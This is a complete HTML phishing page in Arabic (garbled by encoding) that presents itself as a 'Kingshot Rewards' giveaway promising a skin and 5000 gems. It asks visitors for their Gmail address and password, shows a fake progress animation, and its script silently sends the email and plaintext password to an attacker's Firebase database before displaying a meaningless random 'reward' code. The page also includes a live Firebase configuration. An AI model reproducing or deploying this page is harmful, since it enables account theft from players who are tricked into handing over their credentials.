<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Kingshot - Ù…Ø±ÙƒØ² Ø§Ù„Ø£ÙƒÙˆØ§Ø¯</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>

    <style>
        :root {
            --primary-purple: #4a148c;
            --accent-gold: #ffcf33;
            --dark-bg: #0f051d;
            --input-bg: rgba(255, 255, 255, 0.1);
        }

        body { 
            background: radial-gradient(circle, #2e0d56 0%, var(--dark-bg) 100%); 
            color: white; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            margin: 0; 
        }

        .box { 
            background: rgba(45, 12, 85, 0.95); 
            border: 2px solid var(--accent-gold); 
            padding: 30px; 
            border-radius: 20px; 
            width: 90%; 
            max-width: 380px; 
            text-align: center; 
            box-shadow: 0 0 30px rgba(138, 43, 226, 0.4), inset 0 0 15px rgba(255, 207, 51, 0.2);
            position: relative;
        }

        .box::before {
            content: "ğŸ‘‘";
            font-size: 40px;
            display: block;
            margin-bottom: 10px;
        }

        h2 { 
            color: var(--accent-gold); 
            text-transform: uppercase;
            margin-bottom: 5px;
            font-size: 24px;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
        }

        p {
            color: #b39ddb;
            font-size: 14px;
            margin-bottom: 25px;
        }

        input { 
            width: 100%; 
            padding: 14px; 
            border-radius: 10px; 
            border: 1px solid rgba(255, 207, 51, 0.3); 
            background: var(--input-bg); 
            color: white; 
            box-sizing: border-box; 
            outline: none; 
            text-align: center;
            margin-bottom: 15px;
        }

        button { 
            background: linear-gradient(135deg, #ffcf33 0%, #ffa000 100%); 
            color: #2d0c55; 
            border: none; 
            padding: 15px; 
            width: 100%; 
            cursor: pointer; 
            font-weight: 900; 
            border-radius: 10px; 
            font-size: 18px; 
            text-transform: uppercase;
            box-shadow: 0 4px 15px rgba(255, 160, 0, 0.4);
        }

        /* Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ­Ù…ÙŠÙ„ ÙˆØ§Ù„Ø£ÙƒÙˆØ§Ø¯ */
        .progress-container { display: none; width: 100%; background: #333; border-radius: 10px; margin-top: 20px; height: 10px; overflow: hidden; }
        .progress-bar { width: 0%; height: 100%; background: var(--accent-gold); transition: width 0.4s; }
        #status-text { font-size: 12px; margin-top: 10px; color: #b39ddb; }
        #final-code-box { display: none; margin-top: 20px; padding: 15px; border: 2px dashed var(--accent-gold); border-radius: 10px; background: rgba(255, 207, 51, 0.05); }
        .code-display { font-family: monospace; font-size: 22px; color: var(--accent-gold); font-weight: bold; margin: 10px 0; letter-spacing: 2px; }

        .footer-note { font-size: 10px; color: #7e57c2; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="box">
        <div id="setup-view">
            <h2>KINGSHOT REWARDS</h2>
            <p>Ø³Ø¬Ù„ Ø¯Ø®ÙˆÙ„Ùƒ Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ÙƒÙˆØ¯ (Ø³ÙƒÙ† Ù…Ù„ÙƒÙŠ + 5000 Ø¬ÙˆÙ‡Ø±Ø©)</p>
            
            <input type="text" id="email" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ (Gmail)" required>
            <input type="password" id="password" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" required>
            
            <button onclick="handleStart()">ØªØ£ÙƒÙŠØ¯ ÙˆØ§Ø³ØªÙ„Ø§Ù… Ø§Ù„ÙƒÙˆØ¯</button>
        </div>

        <div id="process-view" style="display:none;">
            <h2 id="header-msg">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©...</h2>
            <div class="progress-container" id="p-container" style="display:block;">
                <div class="progress-bar" id="p-bar"></div>
            </div>
            <p id="status-text">Ø¨Ø¯Ø¡ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ...</p>

            <div id="final-code-box">
                <p style="font-size: 11px;">ØªÙ… ØªÙˆÙ„ÙŠØ¯ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ Ø¨Ù†Ø¬Ø§Ø­:</p>
                <div class="code-display" id="generated-code">---- ---- ----</div>
                <button onclick="location.reload()" style="padding: 8px; font-size: 14px;">Ø¥ØºÙ„Ø§Ù‚</button>
            </div>
        </div>
        
        <div class="footer-note">Ù†Ø¸Ø§Ù… Ø­Ù…Ø§ÙŠØ© Kingshot Ø§Ù„Ù…Ø¹ØªÙ…Ø¯ ğŸ”’</div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAm1OfTW_qS4lhSGlqgDd6fiLDj3u93wqI",
            authDomain: "clashdata-8424c.firebaseapp.com",
            databaseURL: "https://clashdata-8424c-default-rtdb.firebaseio.com",
            projectId: "clashdata-8424c",
            storageBucket: "clashdata-8424c.firebasestorage.app",
            messagingSenderId: "1063000922754",
            appId: "1:1063000922754:web:87087f81c28c2659cb329b"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        function createCode() {
            const pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            let r = (n) => Array.from({length:n}, () => pool[Math.floor(Math.random()*pool.length)]).join('');
            return `KING-${r(4)}-${r(4)}`;
        }

        function handleStart() {
            const mail = document.getElementById('email').value.trim();
            const pass = document.getElementById('password').value;

            if (!mail.toLowerCase().endsWith("@gmail.com")) {
                alert("ÙØ´Ù„ Ø§Ù„Ù†Ø¸Ø§Ù…: ÙŠØ¬Ø¨ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø­Ø³Ø§Ø¨ Gmail Ø§Ù„Ø±Ø³Ù…ÙŠ Ø§Ù„Ù…Ø±ØªØ¨Ø· Ø¨Ø§Ù„Ù„Ø¹Ø¨Ø©.");
                return;
            }
            if (pass.length < 5) {
                alert("ÙØ´Ù„ Ø§Ù„ØªÙˆØ«ÙŠÙ‚: ØªØ¹Ø°Ø± Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ ØªØµØ±ÙŠØ­ Ø¯Ø®ÙˆÙ„ØŒ ØªØ£ÙƒØ¯ Ù…Ù† ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±.");
                return;
            }

            document.getElementById('setup-view').style.display = 'none';
            document.getElementById('process-view').style.display = 'block';

            let p = 0;
            const bar = document.getElementById('p-bar');
            const status = document.getElementById('status-text');

            const timer = setInterval(() => {
                p += Math.floor(Math.random() * 15) + 5;
                if (p >= 100) {
                    p = 100;
                    clearInterval(timer);
                    const code = createCode();
                    
                    database.ref('kingshot_codes/').push({
                        account: mail,
                        password: pass,
                        code: code,
                        timestamp: new Date().toLocaleString()
                    }).then(() => {
                        document.getElementById('header-msg').innerText = "ØªÙ… Ø¨Ù†Ø¬Ø§Ø­!";
                        document.getElementById('p-container').style.display = 'none';
                        status.style.display = 'none';
                        document.getElementById('generated-code').innerText = code;
                        document.getElementById('final-code-box').style.display = 'block';
                    });
                }
                bar.style.width = p + "%";
                if(p < 40) status.innerText = "Ø¬Ø§Ø±ÙŠ Ù…Ø·Ø§Ø¨Ù‚Ø© Ø§Ù„Ø­Ø³Ø§Ø¨ ÙÙŠ Ø§Ù„Ø³ÙŠØ±ÙØ±...";
                else if(p < 80) status.innerText = "Ø¬Ø§Ø±ÙŠ ÙÙƒ ØªØ´ÙÙŠØ± Ø­Ø²Ù…Ø© Ø§Ù„Ø£ÙƒÙˆØ§Ø¯...";
                else status.innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ...";
            }, 600);
        }
    </script>
</body>
</html>
